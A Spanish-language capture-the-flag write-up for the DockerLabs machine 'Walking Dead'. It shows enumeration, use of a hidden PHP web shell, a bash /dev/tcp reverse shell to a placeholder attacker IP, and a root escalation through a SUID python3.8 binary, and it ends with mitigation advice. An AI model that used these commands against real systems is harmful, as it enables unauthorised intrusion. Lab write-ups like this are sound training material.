# Walking Dead

> El código fuente de la web filtra una web shell oculta; con ffuf descubro su parámetro vulnerable (cmd), consigo ejecución de comandos y una reverse shell como www-data, y escalo a root abusando del bit SUID en python3.8.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 22/tcp (SSH), 80/tcp (HTTP) |
| **Saltos de usuario** | 1 |

**Tags:** `Gobuster` · `ffuf` · `Command Injection` · `Web shell` · `Reverse shell` · `SUID` · `python3` · `GTFOBins`

---

## Reconocimiento

Lanzo un escaneo completo de puertos con detección de servicios y versiones para ver a qué me enfrento.

```bash
$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: The Walking Dead - CTF
```

Dos puertos: SSH (22) y una web temática (80). Empiezo por la web.

## Enumeración web

Al revisar el código fuente de la portada aparece un enlace escondido muy jugoso.

```bash
$ curl -s http://172.17.0.2 | grep -i hidden
<p class="hidden-link"><a href="hidden/.shell.php">Access Panel</a></p>
```

Hay una carpeta `hidden` con un fichero oculto `.shell.php` que, al abrirlo, se ve en blanco: todo su código es PHP que se ejecuta en el servidor. Confirmo la estructura con gobuster.

```bash
$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 100
/hidden               (Status: 301)
/backup.txt           (Status: 200)
/index.html           (Status: 200)
```

## Ejecución de comandos

Esa web shell seguramente espera un parámetro para ejecutar comandos. Lo busco con ffuf fuzzeando el nombre del parámetro y filtrando las respuestas vacías con `-fs 0`.

```bash
$ ffuf -u 'http://172.17.0.2/hidden/.shell.php?FUZZ=whoami' -w /usr/share/wordlists/dirb/common.txt -fs 0
cmd                     [Status: 200, Size: 9]
```

El parámetro es `cmd`. Lo pruebo y confirmo la ejecución de comandos como www-data.

```bash
$ curl 'http://172.17.0.2/hidden/.shell.php?cmd=whoami'
www-data
```

## Reverse shell

Me pongo a la escucha en una terminal con netcat.

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
```

Desde el navegador lanzo la reverse shell por el parámetro `cmd`. El `&` de la redirección va URL-encodeado como `%26`.

```bash
http://172.17.0.2/hidden/.shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/<IP_ATACANTE>/4444 0>%261'
```

Vuelvo a la terminal: ya tengo la shell como **www-data**. La convierto en una TTY en condiciones con Python.

```bash
connect to [<IP_ATACANTE>] from (UNKNOWN) [172.17.0.2]
www-data@1d3cc124941a:/var/www/html/hidden$ whoami
www-data
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Escalada a root · SUID

Busco binarios con el bit SUID activado.

```bash
$ find / -type f -perm -4000 -ls 2>/dev/null
... /usr/bin/su /usr/bin/sudo /usr/bin/passwd ...
/usr/bin/python3.8   <-- intérprete con SUID: abusable
```

`python3.8` tiene SUID de root. Según GTFOBins, puedo pedirle que lance una bash conservando los privilegios con `-p`.

```bash
$ python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
bash-5.0# whoami
root
```

Máquina Walking Dead completada: `uid=0(root)`.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Web shell oculta con ejecución de comandos

`CWE-78` · A03:2021 – Injection

**Impacto.** El fichero hidden/.shell.php acepta un parámetro 'cmd' que ejecuta comandos del sistema sin ningún control, dando RCE como www-data.

**Mitigación.** Eliminar la web shell; nunca ejecutar entrada del usuario con system()/exec() y aplicar WAF y revisiones de código.

### 🔴 CRÍTICA — Escalada a root por bit SUID en python3.8

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** python3.8 tiene el bit SUID de root: cualquier usuario local obtiene una shell root en un solo comando (GTFOBins).

**Mitigación.** Quitar el SUID (chmod u-s /usr/bin/python3.8) y auditar los binarios con SUID.

### 🟡 MEDIA — Ruta sensible filtrada en el código fuente

`CWE-200` · A05:2021 – Security Misconfiguration

**Impacto.** Un comentario en el HTML revela la ruta de la shell oculta (hidden/.shell.php), facilitando el acceso directo al backdoor.

**Mitigación.** No dejar rutas ni pistas internas en el código que se sirve al público.

---

_Writeup de **Walking Dead** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
